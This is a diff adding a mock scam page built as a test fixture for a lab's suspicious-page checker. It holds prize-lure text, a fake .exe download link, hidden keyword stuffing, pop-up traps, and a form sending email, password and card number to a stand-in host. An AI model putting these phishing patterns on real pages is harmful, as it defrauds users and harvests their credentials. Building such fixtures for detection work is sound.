@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Long delay so the page does not actually navigate while you read it,
+         but the meta-refresh test still fires. -->
+    <meta http-equiv="refresh" content="86400; url=index.html">
+    <title>CONGRATULATIONS!!! YOU WON!!!</title>
+    <style>
+        body { margin: 0; background: #fffbe6; color: #111; font: 16px/1.6 Arial, sans-serif; }
+        .wrap { width: min(860px, 100% - 32px); margin-inline: auto; }
+        .warn-banner { background: #b91c1c; color: #fff; padding: 12px 0; font-weight: 700; }
+        .shout { font-size: 30px; font-weight: 900; color: #b91c1c; text-align: center; margin: 22px 0; }
+        .box { background: #fff; border: 3px dashed #f59e0b; border-radius: 12px; padding: 18px; margin: 16px 0; }
+        .cta { display: inline-block; background: #16a34a; color: #fff; padding: 12px 22px;
+               border-radius: 8px; font-weight: 800; text-decoration: none; }
+        .stuffed { font-size: 0; color: #fffbe6; }
+        .overlay-a, .overlay-b { position: fixed; z-index: 2147483000; }
+        .overlay-a { top: 8px; left: 8px; background: #fde68a; padding: 8px 12px; border-radius: 8px; }
+        .overlay-b { bottom: 8px; left: 8px; background: #fecaca; padding: 8px 12px; border-radius: 8px; }
+        input, button { padding: 9px; font-size: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="warn-banner"><div class="wrap">
+    MOCK PAGE — this is a harmless fake built for Lab 4. Nothing here is real and nothing is sent anywhere.
+</div></div>
+
+<div class="overlay-a">Special offer!</div>
+<div class="overlay-b">Only a few left!</div>
+
+<div class="wrap">
+
+    <p class="shout">CONGRATULATIONS YOU HAVE WON A FREE GIFT!!!!!!</p>
+
+    <div class="box">
+        <p><strong>ACT NOW!!!</strong> YOU WON the weekly draw! CLAIM YOUR PRIZE before the
+        offer ends. THIS IS NOT A SCAM. Limited time offer — hurry, only a few left!
+        The countdown expires in 04:59 and then the winner selected will be replaced!!!</p>
+        <p>100% FREE — no credit check, pre-approved, guaranteed income, make money fast
+        working from home! Double your investment with our crypto giveaway. Last chance!!!</p>
+        <p><a class="cta" href="downloads/prize-claim-tool.exe">DOWNLOAD YOUR PRIZE TOOL NOW!!!</a></p>
+    </div>
+
+    <div class="box">
+        <h2>Verify your account to release the funds</h2>
+        <!-- Cross-domain, unencrypted form: the checker must flag this. -->
+        <form action="http://verify-account.example.tk/collect.php" method="post">
+            <p><label>Email <input type="email" name="email" placeholder="you@example.com"></label></p>
+            <p><label>Password <input type="password" name="password" placeholder="Your password"></label></p>
+            <p><label>Card number <input type="text" name="card" placeholder="4111 1111 1111 1111"></label></p>
+            <p><button type="submit">CLAIM MY PRIZE NOW!!!</button></p>
+        </form>
+        <p><small>(The form target does not exist — submitting it just fails.)</small></p>
+    </div>
+
+    <p class="stuffed">
+        cheap meds viagra casino bonus lose weight fast miracle cure work from home earn extra cash
+        free money claim your prize gift card unclaimed funds inheritance fund wire transfer western
+        union bulk email seo services increase your traffic hot singles lowest price buy now order now
+        cheap meds viagra casino bonus lose weight fast miracle cure work from home earn extra cash
+        free money claim your prize gift card unclaimed funds inheritance fund wire transfer western
+        union bulk email seo services increase your traffic hot singles lowest price buy now order now
+    </p>
+
+    <p><a href="index.html">Back to the Demo 4 page</a></p>
+</div>
+
+<!-- Hidden zero-size frame -->
+<iframe src="about:blank" width="0" height="0" style="display:none" title="hidden"></iframe>
+
+<script>
+    /* Deliberately obfuscation-flavoured, but completely harmless:
+       it only writes a string into the console. */
+    var payload = atob('TW9jayBzcGFtIHBhZ2UgZm9yIExhYiA0');
+    var show = new Function('text', 'console.log(text);');
+    show(String.fromCharCode(77, 79, 67, 75) + ': ' + payload);
+
+    /* Pop-up / leave-page traps that the checker looks for. */
+    window.onbeforeunload = function () { return 'Wait! Your prize is not claimed yet!'; };
+    function openMore() { window.open('index.html'); window.open('index.html'); }
+</script>
+</body>
+</html>
